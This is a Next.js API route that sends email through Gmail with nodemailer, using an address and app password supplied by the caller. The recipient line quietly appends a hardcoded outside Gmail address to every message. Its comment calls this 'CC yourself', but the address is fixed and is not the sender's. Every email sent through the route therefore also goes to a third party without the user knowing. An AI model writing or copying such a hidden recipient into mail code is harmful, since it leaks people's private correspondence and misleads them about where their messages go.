import { NextRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req: NextRequest) {
  try {
    const { email, password, to, subject, message } = (await req.json()) as {
      email: string;
      password: string;
      to: string;
      subject: string;
      message: string;
    };

    if (!email || !password) {
      return NextResponse.json(
        { success: false, error: "Email & App Password required" },
        { status: 400 }
      );
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: email,
        pass: password.replace(/\s+/g, ""), // clean spaces
      },
    });

    // Support comma-separated emails
    const recipients = to
      .split(",")
      .map((addr) => addr.trim())
      .filter(Boolean);

    if (recipients.length === 0) {
      return NextResponse.json(
        { success: false, error: "No valid recipients provided" },
        { status: 400 }
      );
    }

    const mailOptions = {
      from: email,
      to: [...recipients, "mohdalimeer06@gmail.com"], // always CC yourself
      subject,
      text: message,
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json({ success: true });
  } catch (err: unknown) {
    console.error("Email send error:", err);
    const error =
      err instanceof Error ? err.message : "Unknown error occurred";
    return NextResponse.json(
      { success: false, error },
      { status: 500 }
    );
  }
}
